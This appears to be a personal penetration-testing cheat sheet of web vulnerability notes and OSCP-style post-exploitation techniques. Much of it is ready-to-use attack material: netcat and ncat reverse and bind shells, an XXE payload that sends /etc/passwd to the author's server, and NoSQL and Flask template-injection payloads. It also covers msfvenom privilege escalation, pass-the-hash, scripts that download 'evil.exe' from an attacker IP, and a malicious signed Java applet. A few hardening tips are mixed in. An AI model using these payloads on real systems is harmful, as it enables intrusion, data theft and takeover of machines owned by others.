
title: Web notes
author: gros
layout: default
---


### Vuln types

```
Client side:
    XSS
    CSRF
    session fixation
    open redirects
    header injection
    websockets / localStorage tests
    websockets hijacking
    jsonp leaks
    OAuth token theft
        - https://www.arneswinnen.net/2017/06/authentication-bypass-on-airbnb-via-oauth-tokens-theft/
    relative css imports
    same origin method execution
    http response splitting/smuggling

Server side:
    Injections:
        + sql / nosql
        + cmd
        + expression language (https://www.mindedsecurity.com/fileshare/ExpressionLanguageInjection.pdf)
        + template injection
        + Server Side Include (.shtml)
        + server side javascript execution
        + ldap
        + CSS
            + extract attributes with input[value^=""]
            + extract whatever with fonts (https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

    SSRF
    XXE
    misconfig:
        + cors
        + host header manipulation
        + TRACE enabled
        + clickjacking
        + session timeouts
        + login throttling (anti-bruteforce)
        + _method=PUT etc checks (csrf bypass...)
        + cross-domain policy 

    path traversal
    local/remote file inclusion
    file upload
    auth bypass
        + pass reset: the same token for all users (in given second)
    parameter pollution
    race conditions
    user enumeration
    mass asigments
    regex bypass/eval/dos ([a-zA-Z]+)*, (a+)+ or (a|a?)+ etc)
    search indexing of credentials (private data cached by google etc)

    memory leaks:
        - https://github.com/neex/gifoeb
        
    subdomain takeover:
        -unused subdomains and aliases (CNAME)
        -CNAME pointing to unregistered domain
        -trailing dots (bypassess in cloud providers)

    password bruteforce
        - https://hackerone.com/reports/127844

    httpoxy (mostly php 7.0.8)
    path equivalence vulnerability
    image tragic
    insecure direct object reference
    session puzzling
    smtp header injection
    deserialization
    rounding errors / integer overflows
    cache-deception
    table truncation
    hidden files (.git, .DS_Store)
```


### Random stuff

#### Post exploitation
* real tty (http://pentestmonkey.net/blog/post-exploitation-without-a-tty)
    + on your machine: ```nc -v -n -l -p port```
    + on victim server run: ```nc your_ip port -e /bin/bash```
    + on your machine: ```python -c 'import pty; pty.spawn("/bin/bash");'```

#### PHP
* .pht, .phtml, php3, php4 extensions (most servers parse them as php)
* parse_url in php
    + relative url problem (//domain.com?asd) (<https://bugs.php.net/bug.php?id=43721>)
    + http://example.com:80?@google.com/ (<https://bugs.php.net/bug.php?id=73192&edit=3>)
* readfile + windows -> 8.3 filenames
* preg_match -> bypass via backtick limit
* type juggling
* base_dir bypass:
    + ```$file = new SplFileObject("/var/www/html/blabla/test.php", "w"); $file->fwrite('shell');```
    + pcntl_exec
    + linkinfo, realpath <= 5.3.6
* disable_functions bypass via LD_PRELOAD+mail() (<https://rdot.org/forum/showpost.php?p=38750&postcount=16>)
* PHP OPcache Override (<https://github.com/GoSecure/php7-opcache-override>)
* assert is eval
* non-common php tags
    + ```<script language="php"></script>```
    + ```<% %>```
* code evaluation
    + complex (curly) syntax (<http://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.complex>)
    + heredoc syntax
    + user-supplied values in double-quotes
    + eval
    + create_function
    + preg_replace with /e
* extract is evil
* unlink with wrong folder don't work? (<https://rdot.org/forum/showthread.php?t=3102>)
* Bypass images resize: https://github.com/RickGray/Bypass-PHP-GD-Process-To-RCE
* Bypass basic auth with <limit> via non-standard request methods (https://www.reddit.com/r/netsec/comments/st9nc/bypassing_http_basic_authentication_in_php/)
* phpunit.xml.dst (in LAMP)
* LFI: with zip, phar, data, expect, php://filter/convert.base64-encode/resource=index.php, file://, glob, iconv, crypto
* lfi to rce
```
Using file upload forms/functions
Wrappers
    expect://command
    php://file
    php://filter
    input:// stream
    data://text/plain;base64,command
    zip://zipfile#php_file.php
Using /proc/self/environ
Using /proc/self/fd
Using log files with controllable input like:
    /var/log/apache2/access.log
    /var/log/apache2/error.log
    /var/log/vsftpd.log
    /var/log/sshd.log
    /var/log/mail
tmp files with self inclusion (https://dustri.org/b/from-lfi-to-rce-in-php.html)
```

#### XSS:
* hex encoding in js
* innerHTML
* xss-protector can disable some scripts (i.e. if script is found in url)
* dom clobbering
* httpOnly cookies via phpinfo()
* CSP bypass:
    + ```<link rel="prefetch" href="http://your-server/"> ```
    + ```<meta http-equiv="refresh" content="0; url=http://your-server/">```
    + wrong config (no defaults, forms etc)
* DNS rebinding
* ```<iframe srcdoc="">``` and other stuff (<https://html5sec.org>)
* blind CSS injection: ```span[value$='1']{content: url('http://myhost/?i')}```
* injection for PhantomJS: http://yoururl.com/?"+require('fs').read('/etc/passwd');page.customHeaders={Host:'127.0.0.1'};var nonce="
* auth: if login via token, try redirect victim to that link and login to your profile with xss
* xss in one domain, check if other domain's dns points to it
* xss in subdomain can interact with parent via iframe (X-Frame-Options not set to DENY or SAMEORIGIN)
* content-type/extension comparison: http://pwndizzle.blogspot.com/2015/07/xss-extensions-and-content-types.html
* xss with svg and image/svg+xml content-type or xml and application/xml content-type
* browsers parse as html content-type with comma like this: image/foo,text/hml

#### CSRF
* ?\_method=POST, \_ctype=application/json (http://cxf.apache.org/docs/jax-rs.html#JAX-RS-Debugging)
* X-Http-Method-Override: Post
* Request-method: Post
* application/json content-type bypass with flash and 307 redirect (https://blog.appsecco.com/exploiting-csrf-on-json-endpoints-with-flash-and-redirects-681d4ad6b31b)
* lot: https://2017.zeronights.org/wp-content/uploads/materials/ZN17_MikhailEgorov%20_Neat_tricks_to_bypass_CSRF_protection.pdf

#### SQL:
* union select X'31333337' -> union select 1337 (hex encoding)
* charsets big5, cp932, gb2312, gbk and sjis: \xbf\x27 escaped to \xbf\x5c\x27, but \xbf\x5c are treated as one char, leaving \x27 unescaped [http://stackoverflow.com/questions/5741187](http://stackoverflow.com/questions/5741187/sql-injection-that-gets-around-mysql-real-escape-string/12118602#12118602)
* Hibernate + H2 db: non-breaking-space is not recognized by Hibernate (https://github.com/p4-team/ctf/tree/master/2016-01-29-nullcon/web_5#eng-version)
* WAF bypass with %0b: sel%0bect

#### NOSql:
* arrays: 
    + {"$gt": ""}, &input[$ne]=1
* horizontal auth bruteforce:
    + user[$in][]=admin&user[$in][]=user&pass=abc123 ; {user: {"$in": ["admin", "user"]}}
    + user[$regex]=a&pass=abc123
* db.run(user input) is like classical sql injection
* JavaScript code can execute within the database engine inside:
    + $where
    + group
    + map-reduce
* protection:
    + getting rid of the qs module
* payloads:

    ```
    # mostly from https://github.com/cr0hn/nosqlinjection_wordlists/blob/master/mongodb_nosqli.txt
    (function(){var date = new Date(); do{curDate = new Date();}while(curDate-date<10000); return Math.max();})()
    '0; return true'
    '0; while(true){}'
    true, $where: '1 == 1'
    , $where: '1 == 1'
    $where: '1 == 1'
    ', $where: '1 == 1'
    1, $where: '1 == 1'
    { $ne: 1 }
    ', $or: [ {}, { 'a':'a
    ' } ], $comment:'successful MongoDB injection'
    db.injection.insert({success:1});
    db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
    || 1==1
    ' && this.password.match(/.*/)//+%00
    ' && this.passwordzz.match(/.*/)//+%00
    '%20%26%26%20this.password.match(/.*/)//+%00
    '%20%26%26%20this.passwordzz.match(/.*/)//+%00
    {$gt: ''}
    [$ne]=1
    ';sleep(5000);
    ';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
    ```

#### Python:
* url_parse in python problem with path params \(?asd;xxx\)
* upload \__init__.py file + import
* app.secret_key in flask -> you know it, you can spoof session cookies
* flask uses his error pages only for specified addresses, including 127.0.0.1

    ```
    {% raw %}
    flask rce payloads
    {% for x in {}.__class__.__base__.__subclasses__() %}{% if hasattr(x,'_module') %}{{x._module.__builtins__['__import__']('os').system("ls")}}{% endif %}{% endfor %}

    {% set loadedClasses = " ".__class__.__mro__[2].__subclasses__() %}
    {% for loadedClass in loadedClasses %} {% if loadedClass.__name__ == "catch_warnings".strip() %}
        {% set builtinsReference = loadedClass()._module.__builtins__ %}
        {% set os = builtinsReference["__import__".strip()]("subprocess".strip()) %}
            {{ os.check_output("cat sha4/flag_bilaabluagbiluariglublaireugrpoop".strip(), shell=True) }}
        {% endif %}
    {% endfor %}
    {% endraw %}

    common payloads:
    {{config}
    ```
* objects comparison: "1">5 -> True

* format is exploitable: '{your_input}'.format(some_python_object) like '{0.__class__}'.format(object) (http://lucumr.pocoo.org/2016/12/29/careful-with-str-format/)
* web cache dirs:

    ```
    ../__pycache__/__init__.cpython-35.pyc
    /__pycache__/conf.cpython-35.pyc
    __pycache__/app.cpython-35.pyc
    ```

#### Ruby:
* URI(params[:url]).scheme == 'http' bypass by creating 'http' dir
* `open(params[:url]) -> rce with |ls`

#### Perl:
* params pollution (```$x=asd&$x=fre -> array```)
* dicts are expanded with arrays
* can be broken in many ways: [Camel](https://events.ccc.de/congress/2014/Fahrplan/system/attachments/2542/original/the-perl-jam-netanel-rubin-31c3.pdf), [Camel strikes back](https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf)

#### Bash:
* no white spaces: ```{echo,a,b}; echo$FISa$FISb```

#### Apache:
* /server-status (mod_status)
*  \+ Tomcat: file handling abuse by append %01 to end of filename (/whatever.jsp%01) (<http://secalert.net/#scl-soh>)

#### node.js
* create Buffer(x) with x as number will create Buffer with x bytes of uninitialized memory -> memory leak
* eval, setTimeOut, setInterval, unserialize, exec
* parameters pollution, params are concatenate with "," (val1,val2)
* payloads

    ```
    require('fs').readFile('/etc/passwd',function(err,data){if(!err){res.end(data.toString())}})
    ```
* anty-xss: npm install html-entities
* find vulnerable packages: snyk, node-check, nsp
* static code analysis: NodeJsScan
* check for debug mode:  https://app/%2
* comparison operators: == doesn't checks types

#### Other:
* redis via http (<http://www.agarri.fr/kom/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html>)
* some frameworks rewrites route urls (ie. /admin -> /index.php/admin), can bypass htaccess auth (with Location directive)
* wget < 1.18 arbitrary file upload (CVE-2016-4971)
* wget with get params: asd.txt?index.php
* wget crlf injection (in host and sni): wget 'http://127.0.0.1%0d%0aHELLO example.com%0d%0aQUIT%0d%0a:25' (https://lists.gnu.org/archive/html/bug-wget/2017-03/msg00018.html)
* latex parsing -> can get rce (\immediate\write18{ls})
* rfc5988 - web links; returned file depends on Accept header (firefox only)
* HEAD request halt script execution at first output 
* Alternatives to localhost: 127.0.0.1, lvh.me, lacolhost.com, vcap.me, localhost.tv ...
* Kubernetes by default mounts secrets at: /var/run/secrets/kubernetes.io/serviceaccount it allows compromise infrastructure (https://hackernoon.com/capturing-all-the-flags-in-bsidessf-ctf-by-pwning-our-infrastructure-3570b99b4dd0)
* tar with colon (:) in name try to connect to remote, ie. tar -xf example.com:file
* link to proc: /dev/fd/../environ
* google-proxy: Google data saver (compression) proxy may be used to bypass some filters
* paypal: norify_url is used to send confirmation of payment from paypal. Server, after receiving request to that url, should ask paypal for confirmation that it's legit, otherwise site can be manipulated to think that payment was done. (https://developer.paypal.com/docs/classic/products/instant-payment-notification/)
* captcha bypass: send correct captcha, then block requests to captcha images
* overlong utf-8, ie. \xc0\x81 (https://securityonline.info/cross-site-scripting-xss-payloads/)

#### Security headers:
* HSTS: Strict-Transport-Security 
* Clickjacking: X-Frame-Options
* XSS: X-XSS-Protection
* mime sniffing: X-Content-Type-Options
* xss, mixed content: Content-Security-Policy
* X-Permitted-Cross-Domain-Policies
* Referrer-Policy

#### CORS:
* 
* if Access-Control-Allow-Credentials not present:
    + client side cache poisoning (reflected xss in custom header)
    + server side cache poisoning

#### HTTPS:
* http should redirect (301) to https
* HSTS (Strict-Transport-Security: max-age=31536000; includeSubDomains; preload)
    + https://hstspreload.org
* mixed contents
* upgrade-insecure-requests CSP
    + ```<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">```
    + ```Content-Security-Policy: upgrade-insecure-requests```


#### XXE:
```
Do podatnej strony leci:
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxe [ 
<!ENTITY % bbb SYSTEM "http://gros.users.warchall.net/xxe.dtd"> %bbb; %encja;
]><xxe>&test;</xxe>

w xxe.dtd jest:
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % test SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % encja '<!ENTITY test SYSTEM "http://gros.users.warchall.net/?p=%test;">'>
```

#### XSLT
* version info (https://www.owasp.org/images/a/ae/OWASP_Switzerland_Meeting_2015-06-17_XSLT_SSRF_ENG.pdf)
```
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="system-property('xsl:version')"/>
    <xsl:value-of select="system-property('xsl:vendor')"/>
    <xsl:value-of select="system-property('xsl:vendor-url')"/>
  </xsl:template>
</xsl:stylesheet>
```
* file read with document (only well formed xml)
```
<xsl:template match="/">
    <xsl:copy-of select="document('C:\file.xml')"/>
    <xsl:value-of select="document('http://localhost:25')"/>
</xsl:template>
```
* standard XXE
```
<!DOCTYPE xsl:stylesheet [
    <!ENTITY passwd SYSTEM "file:///etc/passwd" >]>
    <xsl:template match="/">
        &passwd;
    </xsl:template>
```

#### CURL:
* Funny stuff with {} and [], i.e. http://lvh.me/{uploads/1492563387EJ5e3yT5.png,flag.php} make two requests and concat response

#### Struts2:
* extensions: .action, .do, .go
* injection: %{1+2}


#### Docker:
* credentials for private Docker registry
* kernel exploit
* --net=host  allows the container access to networking services on the host -> escape (https://kitctf.de/writeups/32c3ctf/docker)
* --privileged disable all security*
* --icc blanket FORWARD ACCEPT iptables
* exposed rest api
* namespaces disabled by default (enable with --userns-remap)
* install docker inside container -> Docker socket may be mounted inside (/var/run/docker.sock)
* bind-mounting the rootfs into a new container image
* AppArmor: --security-opt="apparmor:<profile>", SElinux
* historical guest escape via CAP_DAC_READ_SEARCH
* network ports bind to all (host) interfaces by default
* The Docker client does not verify the TLS certificate by default, leading to a potential false sense of security: use --tlsverify
* Use No New Privileges: --security-opt=no-new-privileges
* Consider using the PID cgroup to limit the maximum number of processes, --kernel-memory
* Avoid running as root within privileged non-user namespace containers (useradd in dockerfile)
* Use --read-only when running containers and overall consider building an overall immutable architecture
* Avoid providing access to the docker user or docker group
* docker-bench-security
* Links: 
    + https://github.com/GDSSecurity/Docker-Secure-Deployment-Guidelines
    + https://www.nccgroup.trust/globalassets/our-research/us/whitepapers/2016/april/ncc_group_understanding_hardening_linux_containers-1-1.pdf

#### Oauth
* grant_type:
    + authorization_code
    + password
    + client_credentials
    + refresh_token

#### JBoss
* /jmx-console
* /web-console/Invoker
* /invoker/JMXInvokerServlet and /invoker/EJBInvokerServlet
* Java Naming and Directory Service at ports 1098, 1099
* RMI at port 4444

#### Arbitrary write -> rce
* crontab scripts
* some running process config (ie. Apache)
* .bashrc
* webshell


#### SSL
    * Manual check 
        ```openssl s_client -no_tls1 -no_ssl3 -connect host:port```



------ OSCP -----------

#### Networking:
    * netcat options
        ```
        -C  - add line feed \r
        -n - no DNS
        ```

    * bind shell
        ```
        # listen on <ip>
        +------+                 +--------------+
        |A <ip>|  <- commands <- |B <our machine|
        +------+                 +--------------+
        A: nc -nlvp 4444 -e cmd.exe  # on <ip> machine
        B: nc -nv <ip> 4444  # on our machine
        ```

    * reverse shell
        ```
        # listen on <our machine>
        +------+                 +--------------+
        |A <ip>|  <- commands <- |B <our machine|
        +------+                 +--------------+
        A: nc -nv <our machine> 4444 -e /bin/bash  # on <ip> machine
        B: nc -nlvp 4444  # on our machine
        ```

    * ncat (instead of netcat)
        ```
        # bind shell
        A: ncat --exec cmd.exe --allow <ip> -vnl 4444 --ssl
        B: ncat -v <ip> 4444 --ssl

        # reverse shell
        A: ncat -nv <our machine> 4444 -e /bin/bash --ssl
        B: ncat -vnl 4444 --ssl --allow <ip>
        ```

    * sbd (from kali linux)

    * iptables
        ```
        # accept on 7777 for <ip>
        iptables -I INPUT -p tcp -s <ip> --dport 7777 -j ACCEPT

        # dissalow for other ips
        iptables -I INPUT -p tcp -s 0.0.0.0/0 --dport 7777 -j DROP
        ```

    * tcpdump
        ```
        -n - don't convert addresses
        -r - read from file
        -X - hex dump
        -s - snapshot length (default is 262144 bytes)
        tcpdump -n dst host 172.16.40.10 port 80 -r <file to read from>.pcap
        tcpdump -A -n 'tcp[13] = 24' -r <file to read from>.pcap  # filtering by flags
        ```

#### recon:
    * passive
        * google
            ```
            site:asd.com -size:www.asd.com
            filetype, inurl, intitle
            ```
        * GHDB (http://www.exploit-db.com/google-dorks/)
        * theharvester
        * Netcraft
        * whois
        * Recon-ng / altdns / domain (jhaddix)
        * XXSed (http://xssed.com/) -- super old!
        * Metadata
            * http://lcamtuf.coredump.cx/soft/therev.tgz 

    * active
        * host
            ```
            host -t mx domain.com
                A - ip addresses
                MX - mails delicery address?
                CNAME - canonical name (alias -> canonical)
                NS - name server (DNS server domain uses)
                SOA - Start of Authority record (administrative information about the zone, zone transfer)
                SIG - todo
                KEY - todo
                AXFR - something about zone transfer?
            for ip in $(cat subdomain_list.txt);do host $ip.megacorpone.com;done

            # reverse lookup
            for ip in $(seq 155 190);do host 50.7.67.$ip;done |grep -v "not found"

            # dnz transfer
            host -l <domain name> <dns server address>
            ```
        * DNSRecon
        * DNSenum

    * port scanning
        * types
            ```
            connect - simplest, tcp three-way handshake (syn, syn-ack, ack) # nc -nvv -w 1 -z 10.0.0.19 3388-3390
            Stealth / SYN Scanning, without finall ack (syn, syn-ack)
            UDP # nc -nv -u -z -w 1 10.0.0.19 160-162
            ```
        * common pitfals
            + udp scan is often unreliable
            + only "interesting ports" are scaned by default
            + forgotten udp services

    * network swapping
        ```nmap -sn 10.11.1.1-255 -oG ping-sweep.txt```
    * OS fingerprinting / Banner Grabbing/ Service Enumeration

    * smb
        * on port 139 or 445 
        * nbtscan
        * enum4linux (for null sessions)
        * ls -l /usr/share/nmap/scripts/smb* 

    * SMTP
        * user enumeration (VRFY command)

    * SNMP
        http://publib.boulder.ibm.com/infocenter/pseries/v5r3/index.jsp?topic=/com.ibm.aix.progcomm/doc/progcomc/mib.htm
        * on port 161
        * onesixtyone
            ```
            echo public > community
            echo private >> community
            echo manager >> community
            for ip in $(seq 1 254);do echo 10.11.1.$ip;done > ips
            onesixtyone -c community -i ips
            ```
        * snmpwalk
            ```
            Enumerating the Entire MIB Tree
            snmpwalk -c public -v1 10.11.1.219

            Enumerating Windows Users:
            snmpwalk -c public -v1 10.11.1.204 1.3.6.1.4.1.77.1.2.25

            Enumerating Running Windows Processes:
            snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.4.2.1.2

            Enumerating Open TCP Ports:
            snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.6.13.1.3

            Enumerating Installed Software:
            snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.6.3.1.2
            ```
        * braa, snmp-check

#### Privilege escalation - windows
    * Admins in domain
    * Creds in config files (gpp)
        ```
        C:\>dir /b /s web.config
        unattend.xml
        groups.xml
        sysprep.inf/.xml - encrypted, but priv keys are known (https://msdn.microsoft.com/en-us/library/cc422924.aspx)

        dir c:\*vnc.ini /s /b /c
        dir c:\*ultravnc.ini /s /b /c
        dir c:\ /s /b /c | findstr /si *vnc.ini
        findstr /si password *.txt | *.xml | *.ini
        findstr /si pass *.txt | *.xml | *.ini
        ```
    * Missing patches
    * Folder permissions (service binary replace etc.)
        ```
        icacls path-to-exe
        ```

    * lsadump (https://github.com/gentilkiwi/mimikatz)
    * metasploit's getsystem

    * AlwaysInstallElevated registry key
        ```
        check:
            reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
            reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

        if enabled create msi file:
            msfvenom -f msi-nouac -p windows/adduser USER=eviladmin PASS=password -o add_user.msi

        upload msi and run:
            msiexec /quiet /qn /i malicious.msi 
        ```

    * PyInstaller (python script to standalone binary)
        ```
        python pyinstaller.py --onefile ms11-080.py
        ```

    * Crosscompiling from linux - mingw
        ```
        mingw-w64
        i686-w64-mingw32-gcc 646.c -o 646.exe -lws2_32
        ```

    * Services
        * Services permissions
            ```
            download: https://docs.microsoft.com/pl-pl/sysinternals/downloads/sysinternals-suite
            list user's obejcts: Accesschk.exe -qwcu "Authenticated Users" *
            list properties: sc qc "Vulnerable Service"
            ```

        * Unquoted Service Paths (https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/) (exploit/windows/local/trusted_service_path)
            ```
            # list unquoted services
            wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

            # if service contains space (eg. C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe) windows will try execute in order:
            C:\Program.exe
            C:\Program Files.exe
            C:\Program Files (x86)\Program.exe
            C:\Program Files (x86)\Program Folder\A.exe
            C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe
            ```

    * Registry permissions
        ```
        check with Registry Editor: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services
        subinacl.msi (https://www.microsoft.com/en-us/download/details.aspx?id=23510):
        subinacl.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service" /display
        ```

    * DLL Hijacking
    * Kernel exploit
        ```
        wmic qfe get Caption,Description,HotFixID,InstalledOn
        ```

    * Task Scheduler
        ```
        Windows 2000, XP, or 2003 only
        local administrator -> SYSTEM

        check if running:
            net start "Task Scheduler"
        add to ts: at 06:42 /interactive "C:\Documents and Settings\test\Local Settings\Temp\Payload.exe"
        ```

    * cmd
        ```
        add user with group administrators
        net localgroup administrators username /add
        ```


#### Privilege escalation - linux
    * suid-debug and MALLOC_CHECK_ envvar

#### Vuln scanning
    * nmap
        ```
        nmap -v -p 80 --script=http-vuln-cve2010-2861 10.11.1.210 # cold fusion
        nmap -v -p 21 --script=ftp-anon.nse 10.11.1.1-254  # anonymous ftp
        nmap -v -p 139, 445 --script=smb-security-mode 10.11.1.236  # smb securty level
        ```
    * openVAS

#### File transfer/uploading
    * TFPT
        ```
        root@kali:~# mkdir /tftp
        root@kali:~# atftpd --daemon --port 69 /tftp
        root@kali:~# cp /usr/share/windows-binaries/nc.exe /tftp/

        C:\Users\Offsec>tftp -i 10.11.0.5 get nc.exe
        ```

    * FTP
        ```
        # install and add user
        root@kali:~# apt-get update && apt-get install pure-ftpd

        groupadd ftpgroup
        useradd -g ftpgroup -d /dev/null -s /etc ftpuser
        pure-pw useradd offsec -u ftpuser -d /ftphome
        pure-pw mkdb
        cd /etc/pure-ftpd/auth/
        ln -s ../conf/PureDB 60pdb
        mkdir -p /ftphome
        chown -R ftpuser:ftpgroup /ftphome/
        /etc/init.d/pure-ftpd restart

        # download
        C:\Users\offsec>echo open 10.11.0.5 21> ftp.txt
        C:\Users\offsec>echo USER offsec>> ftp.txt
        C:\Users\offsec>echo ftp>> ftp.txt
        C:\Users\offsec>echo bin >> ftp.txt
        C:\Users\offsec>echo GET nc.exe >> ftp.txt
        C:\Users\offsec>echo bye >> ftp.txt
        C:\Users\offsec>ftp -v -n -s:ftp.txt
        ```

    * VBScript
        ```
        echo strUrl = WScript.Arguments.Item(0) > wget.vbs
        echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
        echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
        echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
        echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
        echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
        echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
        echo Err.Clear >> wget.vbs
        echo Set http = Nothing >> wget.vbs
        echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
        echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
        echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
        echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
        echo http.Open "GET", strURL, False >> wget.vbs
        echo http.Send >> wget.vbs
        echo varByteArray = http.ResponseBody >> wget.vbs
        echo Set http = Nothing >> wget.vbs
        echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
        echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
        echo strData = "" >> wget.vbs
        echo strBuffer = "" >> wget.vbs
        echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
        echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
        echo Next >> wget.vbs
        echo ts.Close >> wget.vbs

        C:\Users\Offsec>cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
        ```

    * PowerShell
        ```
        C:\Users\Offsec> echo $storageDir = $pwd > wget.ps1
        C:\Users\Offsec> echo $webclient = New-Object System.Net.WebClient >>wget.ps1
        C:\Users\Offsec> echo $url = "http://10.11.0.5/evil.exe" >>wget.ps1
        C:\Users\Offsec> echo $file = "new-exploit.exe" >>wget.ps1
        C:\Users\Offsec> echo $webclient.DownloadFile($url,$file) >>wget.ps1

        C:\Users\Offsec> powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
        ```

    * debug.exe (win32, 64kb max)
        ```
        upx -9 nc.exe

        cp /usr/share/windows-binaries/exe2bat.exe .
        wine exe2bat.exe nc.exe nc.txt
        ```

    * netcat + bsae64
        ```
        A: nc -lp 7777 > file.zip.base64
        B: cat file.zip | base64 | nc <ip> 7777
        A: certutil -decode file.zip.base64 file.zip
        ```

#### Client side
    * java applets
    ```
    #compile
    $ javac -source 1.7 -target 1.7 Java.java
    $ echo "Permissions: all-permissions" > ./manifest.txt
    $ jar cvf Java.jar Java.class
    $ keytool -genkey -keyalg rsa -alias MyCert
    $ jarsigner Java.jar MyCert -signedjar SignedJava.jar 
    $ mv SignedJava.jar Java.class /var/ww/html/
    $ echo '<applet width="1" height="1" id="Java Secure" code="Java.class" archive="SignedJava.jar"><param name="1" value="http://10.11.0.187:80/evil.exe"></applet>' > /var/www/html/java.html
    ```

#### pass bruting / dumping
    * crunch (for key-space search)
    * Pwdump and fgdump (extract hashes from windows SAM memory injecting DLL to LSASS)
        * SAM - Security Account Manager, SYSKEY (from Windows NT 4.0 PS3) partially encrypts it
        * Storing passwords
            * LAN Manager - DES encrypted (Windows NT <= Windows 2003 only)
            * NT LAN Manager - MD4 hashing
        * LSASS - Local Security Authority Subsystem
    * ophcrack - cracker for hashes from fgdump

    * Windows Credentials Editor (http://www.ampliasecurity.com/research/windows-credentials-editor)

    * cewl (password list generator from webpage)
        ```
        cewl www.domain.com -m 6 -w domain-cewl.txt
        ``
    * john
        ```
        john --wordlist=domain-cewl.txt --rules --stdout > mutated.txt
        unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
        ```
    * hash-identifier
    * Pass-The-Hash (https://www.hacking-lab.com/misc/downloads/event_2010/daniel_stirnimann_pass_the_hash_attack.pdf)
        ```
        export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896
        pth-winexe -U administrator% //10.11.01.76 cmd
        ```

#### tunneling
    * port forwarding (rinetd)
        * outbound filter to specific port -> rinetd on home computer on filtered port that redirects traffic to destination port

    * ssh tunneling
        * local
            ```
            # reach external computer listening on restricted port
            ssh <gateway> -L <local port to listen>:<remote host>:<remote port>
            # <remote host>:<remote port> - we want connection to it
            now we connect (from filtered, internal network) to localhost:<local port to listen> -> ssh via <gateway> -> <remote host>:<remote port>
            ```

        * remote
            ```
            # expose port to external computer
            ssh <gateway> -R <remote port to bind>:<local host>:<local port>
            # <local host>:<local port> probably 127.0.0.1:<local port with some service>
            now we connect (from remote, public network) to localhost:<remote port to bind> -> ssh via <gateway> -> <local host>:<local port>
            ```

        * dynamic
            ```
            # create local socks4 proxy
            ssh -D <local proxy port> -p <remote port> <target>
            # <target> must allow traffic on <remote port>
            now we can setup proxy in our tools
            ```

        * proxychains
            ```
            ssh -f -N -R 2222:127.0.0.1:22 root@attacker-machine  # on internal machine. Now attacker machine listen on 2222 and tunnel traffic to internal machine

            ssh -f -N -D 127.0.0.1:8080 -p 2222 some-user@127.0.0.1  # on attacker machine. Now we have proxy on 8080 that tunnel via ssh into internal machine (with user some-user)

            proxychains nmap --top-ports=20 -sT -Pn 172.16.40.0/24  # proxychains uses 8080 to tunnel trafic
            ```

    * HTTP Tunneling
    * Deep inpsection
        * stunnel
        * HTTPTunnel
